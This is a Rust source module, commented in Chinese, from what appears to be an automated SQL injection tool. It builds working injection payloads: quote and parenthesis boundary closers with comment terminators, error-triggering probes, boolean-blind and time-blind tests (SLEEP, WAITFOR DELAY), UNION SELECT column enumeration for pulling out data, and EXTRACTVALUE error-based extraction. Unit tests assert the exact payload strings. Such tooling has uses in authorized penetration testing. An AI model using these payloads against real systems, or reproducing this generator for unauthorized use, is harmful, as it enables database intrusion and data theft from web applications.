//! 四类注入技术的**载荷生成**(纯函数)。所有生成器都接收注入点的**原始值** `value`,
//! 在它后面拼上闭合边界 + 注入逻辑;真正放进请求(并编码)由 [`crate::build_probe`] 负责。

use crate::dialect::{Dbms, Scalar};

/// 注入边界:闭合原值所在的字符串 / 括号上下文(`prefix`),并用注释截断后续 SQL(`suffix`)。
/// 覆盖最常见的数值 / 单引号 / 双引号 / 括号上下文,统一以 `-- -` 注释收尾(对各库通用)。
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct Boundary {
    pub prefix: &'static str,
    pub suffix: &'static str,
}

impl Boundary {
    /// 展示标签(把空 prefix 显示为 `(numeric)`)。
    pub fn label(self) -> String {
        let p = if self.prefix.is_empty() {
            "(numeric)"
        } else {
            self.prefix
        };
        format!("{p}{}", self.suffix)
    }
}

/// 内置边界集(从最常见到较少见)。
pub const BOUNDARIES: &[Boundary] = &[
    Boundary { prefix: "'", suffix: " -- -" },   // 单引号字符串
    Boundary { prefix: "", suffix: " -- -" },    // 数值
    Boundary { prefix: "\"", suffix: " -- -" },  // 双引号字符串
    Boundary { prefix: "')", suffix: " -- -" },  // 字符串在括号里
    Boundary { prefix: ")", suffix: " -- -" },   // 数值在括号里
    Boundary { prefix: "'))", suffix: " -- -" }, // 字符串在两层括号里
];

/// 报错探测用的语法破坏字符(逐个追加到原值后,看响应是否冒出数据库报错)。
pub const ERROR_PROBES: &[&str] = &["'", "\"", "')", "';", "\")", "`", "\\"];

/// 联合查询尝试的最大列数。
pub const UNION_MAX_COLS: usize = 10;

/// 报错探测载荷:原值 + 各破坏字符。
pub fn error_probe_values(value: &str) -> Vec<String> {
    ERROR_PROBES.iter().map(|p| format!("{value}{p}")).collect()
}

/// 一组布尔盲注测试:对某边界给出恒真 / 恒假两个值(随 `nonce` 取不同比较常数,避开缓存 / WAF)。
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct BooleanTest {
    pub boundary: Boundary,
    /// 条件恒真(`AND n=n`):响应应接近原始。
    pub truthy: String,
    /// 条件恒假(`AND n=n+1`):响应应明显偏离。
    pub falsy: String,
}

/// 为每个内置边界生成布尔盲注的真 / 假对。
pub fn boolean_tests(value: &str, nonce: u32) -> Vec<BooleanTest> {
    let a = 1000 + nonce % 9000;
    let b = a + 1;
    BOUNDARIES
        .iter()
        .map(|bd| {
            let p = bd.prefix;
            let s = bd.suffix;
            BooleanTest {
                boundary: *bd,
                truthy: format!("{value}{p} AND {a}={a}{s}"),
                falsy: format!("{value}{p} AND {a}={b}{s}"),
            }
        })
        .collect()
}

/// 一个时间盲注测试:让某方言睡眠的注入值。
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct TimeTest {
    pub dbms: Dbms,
    pub boundary: Boundary,
    pub value: String,
}

/// 为每个(支持时间盲注的)方言 × 每个边界生成睡眠注入值(睡 `secs` 秒)。
pub fn time_tests(value: &str, secs: u32) -> Vec<TimeTest> {
    let mut out = Vec::new();
    for dbms in Dbms::ALL {
        let Some(ti) = dbms.time_condition(secs) else {
            continue;
        };
        for bd in BOUNDARIES {
            let p = bd.prefix;
            let s = bd.suffix;
            let sql = &ti.sql;
            let value = if ti.stacked {
                format!("{value}{p};{sql}{s}")
            } else {
                format!("{value}{p} {sql}{s}")
            };
            out.push(TimeTest {
                dbms,
                boundary: *bd,
                value,
            });
        }
    }
    out
}

/// 一个联合查询测试:用 `cols` 列、把外带标量放在第 `pos` 列。
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct UnionTest {
    pub cols: usize,
    pub pos: usize,
    pub scalar: Scalar,
    pub value: String,
}

/// 单条联合查询载荷:`cols` 列,把外带标量放在第 `pos` 列(其余列填 `NULL`)。
pub fn union_value(
    value: &str,
    boundary: Boundary,
    dbms: Dbms,
    scalar: Scalar,
    cols: usize,
    pos: usize,
) -> String {
    let p = boundary.prefix;
    let s = boundary.suffix;
    let marked = dbms.wrap_scalar(dbms.scalar(scalar));
    let list = (0..cols)
        .map(|i| if i == pos { marked.clone() } else { "NULL".to_string() })
        .collect::<Vec<_>>()
        .join(",");
    format!("{value}{p} UNION SELECT {list}{s}")
}

/// 为某方言生成联合查询取数载荷:列数 `1..=max_cols`,每个列数下把外带标量轮流放到各列
/// (命中 = 响应里出现外带标记 → 同时确定列数与可显的字符串列)。
pub fn union_tests(
    value: &str,
    boundary: Boundary,
    dbms: Dbms,
    scalar: Scalar,
    max_cols: usize,
) -> Vec<UnionTest> {
    let mut out = Vec::new();
    for cols in 1..=max_cols {
        for pos in 0..cols {
            out.push(UnionTest {
                cols,
                pos,
                scalar,
                value: union_value(value, boundary, dbms, scalar, cols, pos),
            });
        }
    }
    out
}

/// 报错型取数载荷:把 `scalar` 的结果挤进数据库报错回显(单次请求即可取回);方言不支持返回 `None`。
pub fn error_extract_value(
    value: &str,
    boundary: Boundary,
    dbms: Dbms,
    scalar: Scalar,
) -> Option<String> {
    let frag = dbms.error_extract(dbms.scalar(scalar))?;
    let p = boundary.prefix;
    let s = boundary.suffix;
    Some(format!("{value}{p} {frag}{s}"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn boolean_pair_true_false_differ() {
        let t = &boolean_tests("7", 0)[0];
        // nonce=0 → a=1000,b=1001。
        assert_eq!(t.truthy, "7' AND 1000=1000 -- -");
        assert_eq!(t.falsy, "7' AND 1000=1001 -- -");
        assert_ne!(t.truthy, t.falsy);
    }

    #[test]
    fn boolean_nonce_changes_constants() {
        let a = &boolean_tests("1", 5)[1]; // 数值边界
        assert_eq!(a.boundary.prefix, "");
        // a = 1000 + 5 % 9000 = 1005。
        assert!(a.truthy.contains("AND 1005=1005"));
    }

    #[test]
    fn error_probes_append_breakers() {
        let v = error_probe_values("9");
        assert!(v.contains(&"9'".to_string()));
        assert!(v.contains(&"9\"".to_string()));
        assert_eq!(v.len(), ERROR_PROBES.len());
    }

    #[test]
    fn time_tests_skip_sqlite_and_stack_mssql() {
        let tests = time_tests("1", 5);
        // 4 个支持方言 × 6 边界 = 24。
        assert_eq!(tests.len(), 4 * BOUNDARIES.len());
        assert!(tests.iter().all(|t| t.dbms != Dbms::Sqlite));
        // MSSQL 用堆叠语句 `;WAITFOR`。
        let mssql = tests.iter().find(|t| t.dbms == Dbms::MsSql).unwrap();
        assert!(mssql.value.contains(";WAITFOR DELAY '0:0:5'"));
        // MySQL 用空格 + 子查询睡眠。
        let mysql = tests.iter().find(|t| t.dbms == Dbms::MySql).unwrap();
        assert!(mysql.value.contains(" AND (SELECT 1 FROM (SELECT SLEEP(5))zz)"));
    }

    #[test]
    fn union_tests_cover_cols_and_positions() {
        let b = BOUNDARIES[0];
        let tests = union_tests("1", b, Dbms::MySql, Scalar::Version, 3);
        // 1 + 2 + 3 = 6 个。
        assert_eq!(tests.len(), 6);
        // 3 列时把标记放在第 1 列(pos=1)。
        let t = tests
            .iter()
            .find(|t| t.cols == 3 && t.pos == 1)
            .unwrap();
        assert!(t.value.contains("UNION SELECT NULL,CONCAT('qScRyQ',(version()),'qScRyQ'),NULL"));
    }

    #[test]
    fn error_extract_value_wraps_with_boundary() {
        let b = BOUNDARIES[0]; // '  -- -
        let v = error_extract_value("1", b, Dbms::MySql, Scalar::Version).unwrap();
        assert!(v.starts_with("1' AND EXTRACTVALUE"));
        assert!(v.ends_with(" -- -"));
        assert!(error_extract_value("1", b, Dbms::Sqlite, Scalar::Version).is_none());
    }
}
